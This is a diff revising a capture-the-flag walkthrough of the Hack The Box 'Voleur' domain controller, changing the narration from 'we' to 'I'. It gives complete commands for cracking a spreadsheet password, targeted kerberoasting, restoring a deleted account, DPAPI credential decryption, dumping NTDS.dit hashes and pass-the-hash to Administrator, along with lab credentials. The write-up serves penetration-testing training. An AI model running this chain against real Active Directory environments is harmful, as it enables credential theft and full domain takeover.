@@ -13,15 +13,15 @@
 **Credentials:** `ryan.naylor: HollowOct31Nyt`
 
 ---
-## Enumeration
+## Recon
 
-We started, as always, with an Nmap scan to identify open ports and running services on the target:
+I'll start with an nmap scan to identify open ports and services:
 
 ```
 nmap -sC -sV -oA Voleur 10.129.59.187 -v
 ```
 
-The results immediately told us we were dealing with a Domain Controller:
+Kerberos, LDAP, and SMB confirm this is a domain controller. What stands out is port `2222` running `OpenSSH` on Ubuntu - unusual for a Windows DC, and a strong hint that some Linux subsystem (WSL or similar) is running alongside it.
 
 ```
 PORT     STATE SERVICE       VERSION
@@ -47,32 +47,26 @@ PORT     STATE SERVICE       VERSION
 Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
 ```
 
-The presence of ports 88 (Kerberos), 389/3268 (LDAP), and 445 (SMB) together is a fingerprint of a Domain Controller. What stood out here, though, was port 2222 running OpenSSH on Ubuntu - an unusual addition for a Windows DC, and a strong hint that some kind of Linux subsystem or dual-boot/WSL setup was in play.
-
-The scan also revealed the domain name (`voleur.htb`) and the hostname (`DC`), so we added both to our `/etc/hosts` file.
+The scan also reveals the domain name (`voleur.htb`) and the hostname (`DC`), so I'll add both to my `/etc/hosts`.
 
 ![](Assets/2026-08-10_15-54.png)
 
-Just like in a real-world assessment, we were handed an initial set of credentials to start with `ryan.naylor:HollowOct31Nyt`.
-
-Before touching anything, let's sync our clock with the DC. Kerberos is time-sensitive by design, if the clock skew between client and server exceeds the default tolerance (usually 5 minutes), the KDC will reject authentication outright, regardless of whether the credentials are correct. 
-
-So we disabled our local NTP sync and pulled the time directly from the target:
+We're given a starting credential, `ryan.naylor:HollowOct31Nyt`. Before touching anything Kerberos-related, I'll sync my clock with the DC. If the clock skew exceeds the default tolerance, the KDC rejects authentication outright regardless of whether the credentials are correct:
 
 ```
 sudo timedatectl set-ntp off 
 sudo rdate -n 10.129.59.187 
 ```
 
-With the clock synced, we tried authenticating to SMB with the provided credentials, and it failed with `STATUS_NOT_SUPPORTED`. This specific error is a strong indicator that NTLM authentication has been disabled on the domain - NetExec confirmed this for us by showing `NTLM:FALSE` in its output:
+With the clock synced, I try SMB with the provided credentials, and it fails with `STATUS_NOT_SUPPORTED`. This specific error usually means NTLM authentication is disabled on the domain. NetExec confirms it by showing `NTLM:FALSE`.
 
 ![](Assets/2026-08-10_15-53.png)
 
-Since NTLM was off the table, we switched to Kerberos authentication using NetExec's `-k` flag, and this time authentication succeeded:
+Since NTLM is off the table, I switch to Kerberos authentication using NetExec's `-k` flag, and this succeeds.
 
 ![](Assets/2026-08-10_15-59.png)
 
-To make sure the rest of our tooling (Impacket, smbclient, etc.) would also authenticate via Kerberos correctly, we generated a `krb5.conf` file directly from NetExec and installed it system-wide:
+To make sure the rest of my tooling authenticates via Kerberos correctly too, I'll generate a `krb5.conf` from NetExec and install it system-wide:
 
 ```
 nxc smb 10.129.59.168 --generate-krb5-file voluer.conf 
@@ -81,31 +75,33 @@ sudo cp voluer.conf /etc/krb5.conf
 
 ![](Assets/2026-08-10_16-02.png)
 
-With Kerberos properly configured, we moved on to enumerating SMB shares:
+## Enumeration
+
+With Kerberos configured, I'll enumerate SMB shares:
 
 ```
 nxc smb 10.129.59.187 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
 ```
 
-This turned up three non-default shares `Finance`, `HR`, and `IT` and showed that `ryan.naylor` had read access to `IT`:
+This turn up three non-default shares `Finance`, `HR`, and `IT` - and `ryan.naylor` has read access to `IT`.
 
 ![](Assets/2026-08-10_16-03.png)
 
-We connected to the `IT` share to see what was inside:
+I'll connect to the `IT` share:
 
 ```
 smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
 ```
 
-Inside, we found a directory named `First-Line Support` containing a file called `Access_Review.xlsx`, which we downloaded for further analysis:
+Inside it, a `First-Line Support` directory contains `Access_Review.xlsx`, which I download.
 
 ![](Assets/2026-08-10_16-28.png)
 
-Opening the file locally prompted us for a password.
+Opening it locally prompts for a password.
 
 ![](Assets/2026-08-10_16-48.png)
 
-To get past this, we extracted a crackable hash from the file using `office2john` and ran it through John the Ripper:
+To get past this, I'll extract a crackable hash from the file using `office2john` and run it through John:
 
 ```
 python3 /usr/share/john/office2john.py Access_Review.xlsx > Access_Review.hash
@@ -114,40 +110,40 @@ john --wordlist=/usr/share/wordlists/rockyou.txt Access_Review.hash
 
 ![](Assets/2026-08-10_16-43.png)
 
-With the recovered password, we reopened the spreadsheet and found a list of usernames alongside several plaintext passwords.
+With the recovered password, the spreadsheet opens and shows a list of usernames alongside several plaintext passwords.
 
 ![](Assets/2026-08-10_17-07.png)
 
 ## Foothold
 
-Next, I turned to BloodHound to map out the domain and look for a viable attack path:
+Next, I'll pull data for BloodHound to map out the domain:
 
 ```
 bloodhound-python -u ryan.naylor -p HollowOct31Nyt -ns 10.129.59.187 -d voleur.htb -k -c all
 zip -r voleur.zip *.json
 ```
 
-`ryan.naylor` holds no meaningful privileges and wasn't a member of any interesting groups:
+`ryan.naylor` holds no meaningful privileges and isn't in any interesting group.
 
 ![](Assets/2026-08-10_17-09.png)
 
-Digging further, though, we found that `svc_ldap` had some genuinely interesting outbound edges in the graph:
+Digging further, though, `svc_ldap` has some interesting outbound edges.
 
 ![](Assets/2026-08-10_18-02.png)
 
-We also checked `Lacey.Miller`, who turned out to be a dead end, but `svc_winrm` stood out as a member of **Remote Management Users** - meaning we can authenticate as `svc_winrm` with WinRM, and therefore an interactive shell:
+I also check `Lacey.Miller`, who turns out to be a dead end, but `svc_winrm` stands out as a member of `Remote Management Users` - meaning an interactive shell is possible once I get his password.
 
 ![](Assets/2026-08-10_18-06.png)
 
-As `svc_ldap` has **WriteSPN** privileges over `svc_winrm`, we can perfrom a kerberoastable attack and if the password is weak, it can be cracked offline.
+`svc_ldap` holds `WriteSPN` over `svc_winrm`. That means I can register a fake SPN on `svc_winrm`, kerberoast him, and if his password is weak, crack it offline.
 
-Let's use `svc_ldap`'s credentials (recovered from the spreadsheet) to set a fake SPN on `svc_winrm`:
+Using `svc_ldap`'s credentials from the spreadsheet, I'll set the fake SPN:
 
 ```
 bloodyad -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'fake/kerberoast' 
 ```
 
-With the SPN in place, we requested the TGS for `svc_winrm`:
+Then request the TGS:
 
 ```
 nxc ldap DC.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hash
@@ -155,70 +151,65 @@ nxc ldap DC.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winr
 
 ![](Assets/2026-08-10_18-29.png)
 
-We then cracked the extracted TGS hash offline:
+I put the hash to john and it cracked to `AFireInsidedeOzarctica980219afi`:
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt svc_winrm.hash
 ```
 
-This successfully cracked to `AFireInsidedeOzarctica980219afi`:
-
 ![](Assets/2026-08-10_18-32.png)
 
-The recovered credentials worked against SMB, but WinRM checks failed through NetExec - this is expected, since NetExec's WinRM check doesn't support Kerberos authentication, so a failure there doesn't necessarily mean the credentials are invalid:
+These credentials work for SMB, but NetExec's WinRM check fails - expected, since that check doesn't support Kerberos authentication, so this doesn't mean the credentials are actually invalid.
 
 ![](Assets/2026-08-10_18-37.png)
 
-Since BloodHound had already confirmed `svc_winrm` belonged to Remote Management Users, we requested a proper Kerberos TGT for the account and used it directly with `evil-winrm`:
+Since BloodHound already confirmed `svc_winrm` is in `Remote Management Users`, I'll request a proper TGT and use it with `evil-winrm` directly:
 
 ```
 impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
 export KRB5CCNAME=svc_winrm.ccache
 ```
 
-This gave us an authenticated WinRM session as `svc_winrm`, and from there we read the user flag:
+This gives an authenticated WinRM session as `svc_winrm`, and from there I read the user flag.
 
 ![](Assets/2026-08-10_21-02.png)
 
 ## Privilege Escalation
 
-`svc_winrm`'s home directory turned up nothing useful, and we didn't have access to any of the other local user profiles on the box:
+`svc_winrm`'s home directory has nothing useful, and I don't have access to the other local profiles.
 
 ![](Assets/2026-08-10_21-29.png)
 
-Going back to the spreadsheet we'd cracked earlier, we noticed a note next to the user `Todd.Wolfe` indicating his account had been deleted:
+Going back to the spreadsheet, there's a note next to `Todd.Wolfe` saying his account was deleted.
 
 ![](Assets/2026-08-10_21-18.png)
 
-Deleted AD accounts aren't necessarily gone - if the Active Directory Recycle Bin is enabled (or the tombstone lifetime hasn't expired), the object can be restored. Here, we used bloodyAD to restore this account:
+A deleted AD account isn't necessarily gone - if the Recycle Bin is enabled, or the tombstone lifetime hasn't expired, it can be restored. I'll restore this account with bloodyAD:
 
 ```
 bloodyad -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set restore "Todd.Wolfe"
 ```
 
-**Note:** There appears to be an automated reset script running on the box that periodically re-deletes or resets this account, so we occasionally had to re-run the restore command after a short wait.
+**Note:** An automated script on the box periodically re-deletes or resets this account, so the restore command sometimes needs a re-run.
 
-Once restored, we authenticated successfully using `Todd.Wolfe`'s credentials from the spreadsheet:
+Once restored, I authenticate with `Todd.Wolfe`'s credentials from the spreadsheet.
 
 ![](Assets/2026-08-10_21-22.png)
 
-Todd also has read access to the `IT` share:
+Todd also has read access to `IT`.
 
 ![](Assets/2026-08-10_22-27.png)
 
-We requested a TGT for Todd and used it to browse the SMB share:
+I request a TGT for him and browse the share:
 
 ```
 impacket-getTGT 'voleur.htb/Todd.Wolfe':'NightT1meP1dg3on14'
 export KRB5CCNAME=Todd.Wolfe.ccache
-```
-
-Now, we can access smb share's as Todd:
-```
 smbclient -U 'voleur.htb/Todd.Wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
 ```
 
-Enumerating further, we found Todd's old home directory:
+Digging around, I find Todd's old home directory, archived under `Second-Line Support\Archived Users\todd.wolfe`:
+
 ```
 smb: \> dir                                                                       
   .                                   D        0  Wed Jan 29 14:40:01 2025
@@ -263,16 +254,14 @@ smb: \Second-Line Support\Archived Users\todd.wolfe\> dir
   Videos                             DR        0  Wed Jan 29 20:43:10 2025                                                    
 ```
 
-Poking around inside this old home directory, we found a DPAPI stored credentials and its corresponding master key file, so we pulled both down:
+Inside it are `DPAPI` stored credentials and their master key file, so I download both:
 
 ```
 get "\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"
 get "\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"
 ```
 
-Windows' DPAPI (Data Protection API) encrypts saved credentials (like those stored by Credential Manager) using a per-user master key, which is itself encrypted with a key derived from the user's password. 
-
-Since we had Todd's password, we can decrypt the master key first:
+Windows' `DPAPI` encrypts saved credentials, like those in Credential Manager, using a per-user master key, which is itself encrypted with a key derived from the user's own password. Since I have Todd's password, I can decrypt the master key first:
 
 ```
 impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
@@ -280,56 +269,56 @@ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'N
 
 ![](Assets/2026-08-10_22-41.png)
 
-...and then use the decrypted master key to unlock the actual stored credential:
+Then use the decrypted master key to unlock the stored credential:
 
 ```
 impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <MASTER_KEY>
 ```
 
-This turned out to be a saved password for a user named `jeremy`:
+This turns out to be a saved password for a user named `jeremy`.
 
 ![](Assets/2026-08-10_22-44.png)
 
-I tried authenticating with these recovered credentials, and somewhat to our surprise - they were valid:
+I try these credentials, and they're valid.
 
 ![](Assets/2026-08-10_22-49.png)
 
-BloodHound showed that `jeremy` was a member of both **Remote Management Users** (meaning WinRM access) and a group called **Third-Line Technician**:
+BloodHound shows `jeremy` is a member of both `Remote Management Users` and `Third-Line Technician`.
 
 ![](Assets/2026-08-10_22-56.png)
 
-We requested a TGT for Jeremy:
+I request a TGT for him:
 
 ```
 impacket-getTGT 'voleur.htb/jeremy.combs':'qT3V9pLXyN7W4m'
 export KRB5CCNAME=jeremy.combs.ccache
 ```
 
-Then, we connected as `jeremy` via `evil-winrm`:
+And connect via `evil-winrm`:
 
 ```
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
 ```
 
-As `jeremy`, we had access to a `Third-Line Support` folder inside the `IT` share:
+As `jeremy`, I can access a `Third-Line Support` folder inside `IT`.
 
 ![](Assets/2026-08-10_23-33.png)
 
-We couldn't access the `Backups` subfolder from this account, but we did find and read a file named `Note.txt.txt`:
+I can't access the `Backups` subfolder from this account, but I do find and read a file named `Note.txt.txt`.
 
 ![](Assets/2026-08-10_23-36.png)
 
-Recalling that our initial Nmap scan had shown an SSH service on port 2222, and noticing an `id_rsa` private key sitting in the current directory, I tried using it to connect over SSH:
+Recalling the SSH service on port `2222` from the initial scan, and noticing an `id_rsa` key sitting in the current directory, I try it over SSH:
 
 ```
 ssh -i id_rsa jeremy.combs@10.129.59.187 -p 2222
 ```
 
-This was refused with a permission denied error :(
+This is refused with a permission denied error.
 
 ![](Assets/2026-08-10_23-43.png)
 
-I checked who the key actually belonged to by dumping its public fingerprint/owner information with `ssh-keygen`:
+I quickly check who the key actually belongs to by dumping its public fingerprint/owner information with `ssh-keygen`:
 
 ```
 ssh-keygen -y -f ./id_rsa
@@ -337,11 +326,11 @@ ssh-keygen -y -f ./id_rsa
 
 ![](Assets/2026-08-11_00-05.png)
 
-This revealed the key belonged to a different account than we'd assumed. Using the correct associated username, we logged in successfully:
+The key belongs to a different account than assumed. Using the correct username, I log in successfully.
 
 ![](Assets/2026-08-11_00-07.png)
 
-Once inside, we found the Windows C: drive mounted at `/mnt/c` - confirming our earlier suspicion that this box was running some form of WSL or a similar Linux-on-Windows integration:
+Once inside, the Windows `C:` drive is mounted at `/mnt/c`, confirming this box runs some form of WSL:
 
 ```
 svc_backup@DC:/mnt/c$ ls
@@ -352,45 +341,43 @@ ls: cannot access 'pagefile.sys': Permission denied
 '$WinREAgent'   'Documents and Settings'   Finance             IT  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
 ```
 
-This time, as `svc_backup`, we could access the `Backups` directory that `jeremy` had been denied:
+As `svc_backup`, I can now access the `Backups` directory that `jeremy` was denied.
 
 ![](Assets/2026-08-11_00-27.png)
 
-Inside, we found registry hive backups and Active Directory database files - exactly what we needed for a full domain compromise:
+Inside, there are registry hive backups and Active Directory database files - exactly what's needed for a full domain compromise.
 
 ![](Assets/2026-08-11_00-28.png)
 
-I pulled these files down to my local machine:
+I pull these down to my local machine:
 
 ```
 scp -i id_rsa -P 2222 svc_backup@10.129.59.187:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
 scp -i id_rsa -P 2222 svc_backup@10.129.59.187:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* . 
 ```
 
-With copies of `SECURITY`, `SYSTEM`, and `NTDS.dit`, we can use `secretsdump` in local mode to extract credentials offline:
+With copies of `SECURITY`, `SYSTEM`, and `NTDS.dit`, I run `secretsdump` in local mode to extract credentials offline:
 
 ```
 impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
 ```
 
-This recovered the NTLM hash for the built-in Administrator account:
+This recovers the NTLM hash for the built-in `administrator` account.
 
 ![](Assets/2026-08-11_00-33.png)
 
-With the Administrator's NTLM hash, we requested a Kerberos TGT using the hash directly:
+With the hash, I request a TGT directly:
 
 ```
 impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.59.187
 export KRB5CCNAME=administrator.ccache
 ```
 
-Finally, we used this ticket to connect with `evil-winrm` as Administrator:
+Finally, I connect with `evil-winrm` as `administrator`. From there, I read the root flag.
 
 ```
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
 ```
-
-From there, we read the root flag and completed the machine
 
 ![](Assets/2026-08-11_00-47.png)
 
